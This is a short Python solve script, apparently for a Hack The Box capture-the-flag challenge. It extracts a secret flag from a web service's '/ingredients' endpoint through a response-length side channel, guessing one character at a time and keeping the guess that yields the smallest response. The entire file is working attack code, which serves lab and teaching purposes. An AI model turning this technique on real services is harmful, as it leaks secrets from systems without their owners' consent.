#!/usr/bin/env python3

import requests

from pwn import log, string, sys


def main():
    host = sys.argv[1]
    url = f'http://{host}/ingredients'
    flag = 'HTB{'

    flag_progress = log.progress('Flag')

    while '}' not in flag:
        flag_progress.status(flag)
        results = []

        for c in string.printable:
            ingredients = 'Secret: ' + flag + c
            r = requests.post(url, json={'ingredients': ingredients})
            content_length = len(r.content)
            results.append(content_length)

        min_value = min(results)
        index = results.index(min_value)

        flag += string.printable[index]

    flag_progress.success(flag)


if __name__ == '__main__':
    main()
